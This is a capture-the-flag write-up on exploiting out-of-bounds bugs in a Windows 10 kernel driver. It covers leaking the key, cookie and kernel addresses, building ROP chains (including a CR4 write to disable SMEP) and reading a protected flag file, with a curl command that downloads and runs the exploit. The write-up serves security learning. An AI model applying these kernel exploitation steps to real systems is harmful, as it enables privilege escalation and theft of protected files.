## Pwn - Breath of Shadow

The goal is to pwn a driver running on Windows 10. We are given a .sys file
and  
a Windows 10 virtual machine image with this driver configured to start  
automatically. While locally we can use VNC to connect and login as a
privileged  
user, we can only access the server via netcat, which will drop us into  
`cmd.exe` running as a low integrity process. We will be able to use `curl` to  
download the exploit to writable `tmp` directory and run it from there, but  
that's about it.

To go forward with the analysis, we need two things:

* Kernel image: start [`pyftpdlib`](https://pypi.org/project/pyftpdlib/) on the  
host, [`WinSCP`](https://winscp.net) in the guest, upload  
`c:\windows\system32\ntoskrnl.exe`.  
* Debugger: [qemu gdbstub](https://wiki.qemu.org/Features/gdbstub) - add `-s`  
to `run.sh` (while at it, `-vga vmware` might also be useful), then run `gdb
-ex  
'target remote localhost:1234'`.

Now we are ready, let's start by checking out the driver:

```  
__int64 __fastcall DriverInit(PDRIVER_OBJECT DriverObject)  
{  
 ...  
 status = IoCreateDevice(DriverObject, 0, &DeviceName, 0x22u, 0x100u, 0,
&DeviceObject);  
 if ( NT_SUCCESS(status) )  
 {  
   DeviceObject->MajorFunction[IRP_MJ_CREATE] = IrpMjCreateClose;  
   DeviceObject->MajorFunction[IRP_MJ_CLOSE] = IrpMjCreateClose;  
   DeviceObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpMjDeviceControl;  
   DeviceObject->DriverUnload = DriverUnload;  
   RtlInitUnicodeString(&DestinationString, L"\\DosDevices\\BreathofShadow");  
   status = IoCreateSymbolicLink(&DestinationString, &DeviceName);  
   ...  
   DeviceObject->Flags |= DO_DIRECT_IO;  
   DeviceObject->Flags &=  ~DO_DEVICE_INITIALIZING;  
   seed = KeQueryTimeIncrement();  
   v4 = (unsigned __int64)(unsigned int)RtlRandomEx(&seed) << 32;  
   v5 = RtlRandomEx(&seed);  
   v3 = "Enable Breath of Shadow Encryptor\n";  
   key = v4 | v5;  
 }  
 ...  
}  
```

It starts with the usual [`DEVICE_OBJECT`](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/ns-
wdm-_device_object  
) creation dance:  
* Call [`IoCreateDevice`](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-
wdm-iocreatedevice  
) to instantiate it.  
* Fill `MajorFunction` array with callbacks:  
 * `IRP_MJ_CREATE` is called when we use `CreateFile` on a device.  
 * `IRP_MJ_DEVICE_CONTROL` is called when we use `DeviceIoControl`.  
 * `IRP_MJ_CLOSE` is called when we use `CloseHandle`.  
* Set `DriverUnload` callback. That one is fairly self-explaining.  
* Call [`IoCreateSymbolicLink`](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-
wdm-iocreatesymboliclink  
) in order to expose the device under the name `\DosDevices\BreathofShadow`  
(Windows, just like any other self-respecting operating system, has a [single  
namespace](https://docs.microsoft.com/en-us/sysinternals/downloads/winobj),  
under which we can find our files, devices, and all the other stuff).  
* Indicate that the device will talk to userspace using [Direct I/O](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/methods-for-
accessing-data-buffers  
).  
* Indicate that we've done initializing the device, and it can now be interacted  
with.

At the end we initialize a global 64-bit variable with random data and tell
the  
world that the mighty Breath of Shadow Encryptor is at our disposal.

`IrpMjCreateClose` and `DriverUnload` are predictably uninteresting. All the  
action is happening in `IrpMjDeviceControl`:

```  
__int64 __fastcall IrpMjDeviceControl(__int64 DeviceObject, struct _IRP *Irp)  
{  
 ...  
 IoStackLocation = IoGetCurrentIrpStackLocation(Irp);  
 if ( IoStackLocation )  
 {  
   if ( *(_DWORD *)(v4 + IoStackLocation) == 0x9C40240B )  
   {  
     DbgPrint("Breath of Shadow Encryptor\n");  
     v3 = DoDeviceControl(Irp, IoStackLocation);  
   }  
   ...  
}  
```

`24` is the offset of [`IO_STACK_LOCATION.DeviceIoControl.IoControlCode`](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/ns-
wdm-_io_stack_location  
), so now we know the ioctl command to send: `0x9C40240B`.

```  
__int64 __fastcall DoDeviceControl(__int64 Irp, __int64 IoStackLocation)  
{  
 ...  
 Type3InputBuffer = *(__m128i **)(IoStackLocation + 32);  
 InputBufferLength = *(unsigned int *)(IoStackLocation + 16);  
 OutputBufferLength = *(unsigned int *)(IoStackLocation + 8);  
 if ( !Type3InputBuffer )  
   return 0xC0000001i64;  
 memset((__m128 *)CryptoBuffer, 0, 0x100ui64);  
 ProbeForRead(Type3InputBuffer, 0x100ui64, 1u);  
 memcpy((__m128i *)CryptoBuffer, Type3InputBuffer, InputBufferLength);  
 for ( i = 0; i < InputBufferLength >> 3; ++i )  
   CryptoBuffer[i] ^= key;  
 ProbeForWrite(Type3InputBuffer, 0x100ui64, 1u);  
 memcpy(Type3InputBuffer, CryptoBuffer, OutputBufferLength);  
 return 0i64;  
}  
```

Well, this is ["shoot me in the face"](https://youtu.be/GkQCAHwz9W0?t=6) kind
of  
thing - two very straightforward OOB errors, which allow us to read from and
to  
write to the stack. To add insult to injury, the code uses Neither I/O via  
`Type3InputBuffer`, which points directly to userspace, instead of the
promised  
Direct I/O, which would require [dancing with MDLs](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls  
).

Exploitation plan:  
* `DeviceIoControl(InputBufferLength=InputBufferLength=0x100)` in order to  
figure out the value of the xor key.  
* `DeviceIoControl(InputBufferLength=0, OutputBufferLength>0x100)` in order to  
read the stack.  
* `DeviceIoControl(InputBufferLength>0x100, OutputBufferLength=0)` in order to  
overwrite the stack and control the value of `RIP`.

By analyzing the assembly code we can learn the stack layout:

* `0x0`: `CryptoBuffer`.  
* `0x100`: Security cookie - will end up being useless very soon.  
* `0x128`: return to `IrpMjDeviceControl+0x5a` - now we know the driver  
load address.  
* `0x158`: return to somewhere in the kernel.

We don't know where the kernel and the stack are, but this is enough
information  
to set meaningful breakpoints. Let's stop at `DoDeviceControl + 0x103` (that's  
the `ret` instruction we plan to control) and check out the stack again:

```  
host$ python3 -m http.server &  
host$ x86_64-w64-mingw32-gcc -o exploit.exe exploit.c  
host$ nc localhost 50216  
c:\ctf>  cd tmp  
c:\ctf\tmp> curl http://<host ip>:8000/exploit.exe -o exploit.exe  
c:\ctf\tmp> exploit.exe /scout  
Key:           0x6c3bae58430487b4  
Driver base:   0xfffff8035ddd1000  
(gdb) b *(0xfffff8035ddd1000+0x140005103-0x140001000)  
(gdb) c  
c:\ctf\tmp> exploit.exe /scout  
(gdb) p/x $rsp  
0xfffff68e9e3697e8  
```

Let's scan the stack for stack addresses:

```  
(gdb) python  
addr = 0xfffff68e9e3697e8  
import struct  
i = gdb.inferiors()[0]  
while True:  
   val, = struct.unpack('<Q', i.read_memory(addr, 8))  
   if val >= 0xfffff68e00000000 and val < 0xfffff68f00000000:  
       print(hex(addr) + ' ' + hex(val))  
   addr += 8  
end  
0xfffff68e9e369860 0xfffff68e9e369b80  
```

So here it is - a pointer to `CryptoBuffer+0x4c0` at offset  
`CryptoBuffer+0x158` - hooray, we can have the stack address now as well!
Since  
each thread has a fixed kernel stack, we can be sure that the value obtained  
this way will persist across multiple `DeviceIoControl` calls.

Let's check out the mysterious kernel return address:

```  
(gdb) x/a $rsp+0x30  
0xfffff68e9e369818:     0xfffff80358a31f39  
(gdb) x/2i 0xfffff80358a31f39  
  0xfffff80358a31f39:   add    $0x38,%rsp  
  0xfffff80358a31f3d:   retq  
(gdb) x/8bx 0xfffff80358a31f39  
0xfffff80358a31f39:     0x48    0x83    0xc4    0x38    0xc3    0x0f    0xb6
0x40  
```

This byte sequence is something we can look up in `ntoskrnl.exe`:

```  
.text:0000000140031EE0 IofCallDriver   proc near  
...  
.text:0000000140031F39                 add     rsp, 38h  
.text:0000000140031F3D                 retn  
```

Looks plausible - we can declare victory on KASLR now. How can we exploit? Now  
that we know xor key, rsp and security cookie value, we can jump anywhere, but  
where to?

First attempt: create a ROP chain to disable [SMEP](  
https://en.wikipedia.org/wiki/Control_register#SMEP  
) and then jump to userspace executable shellcode buffer. `ntoskrnl.exe` is a  
trove of ROP gadgets of all shapes and sizes, and [ROPgadget](  
https://github.com/JonathanSalwan/ROPgadget  
) can gives us all of them!

```  
Buf[pos++] = (KernelBase + 0x14001FC39 - 0x140001000);  /* pop rcx ; ret */  
Buf[pos++] = 0x406f8;                                   /* cr4 value */  
Buf[pos++] = (KernelBase + 0x14017ae47 - 0x140001000);  /* mov cr4, rcx ; ret
*/  
```

What was [`KERNEL_SECURITY_CHECK_FAILURE`](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check
---bug-check-0x139-kernel-security-check-failure  
) again? Apparently in the meantime PatchGuard has been trained to detect CR4  
modifications. Tough luck.

Attempt 2: use ROP chain to call [`ZwOpenFile`](  
https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-
wdm-zwopenfile  
) in order to create a userspace handle for `c:\flag.txt` and then, since we  
have messed the kernel stack up beyond repair, don't even think about
returning  
to userspace, but rather park the thread in an endless loop - thanks to kernel  
preemption the system remains operational. We can forge `ZwOpenFile` arguments  
on the stack next to the ROP chain.

After countless crashes, four lessons were learned:

* Check layout of function arguments 7 times. Set a breakpoint in order to  
inspect how they look like during normal system operation.  
* Don't put said arguments (and anything at all) above the stack pointer -  
interrupt handlers will mess them up.  
* Align stack to 16 bytes before calling functions, or else `MOVDQA` and friends  
will throw up.  
* `ZwOpenFile` can create only kernel handles.

These crashes were also somewhat hard to debug. Normally one configures
Windows  
to generate `MEMORY.DMP` containing kernel memory, ensures there is enough
disk  
space (`qemu-img resize` + `diskmgmt.msc` to the rescue) and that swap is on,  
installs [WinDbg](  
https://www.microsoft.com/en-us/p/windbg-
preview/9pgjgd53tn86?activetab=pivot:overviewtab  
) and meditates on the output of `!analyze -v`. Unfortunately, for whatever  
reason, `MEMORY.DMP` was generated only once, and the following gdb script had  
to be used for tracing for the rest of the session instead:

```  
(gdb) set logging redirect on  
(gdb) set logging overwrite on  
(gdb) set pagination off  
(gdb) set logging on  
python  
while True:  
   gdb.execute('x/i $pc')  
   gdb.execute('info registers')  
   gdb.execute('si')  
end  
```

So, there appears to be no easy way to forge userspace handles. Messing with  
credentials sounds even more complicated, so attempt 3 is: `ZwReadFile` +  
`memmove` into user space buffer, which is periodically read by a separate  
thread. In theory this should not be possible due to [`SMAP`](  
https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention  
), however, the driver gets a `Type3InputBuffer`, for which, apparently, an  
exception is made.

Another seemingly endless series of crashes teaches us the following:

* It's better to generate longer ROP sequences in two passes in order to avoid  
manually computing offsets.  
* If a function writes its result to memory (looking at you,  
`ZwOpenFile.FileHandle`) and another function wants this value as a register  
argument, don't rush to look for dereference gadgets - if stack address is  
known, just make the first function write the value directly into the  
corresponding second function's ROP slot.

This time the exploit works and prints the flag!  

Original writeup
(https://github.com/mephi42/ctf/tree/master/2019.10.12-HITCON_CTF_2019/pwn-
Breath_of_Shadow).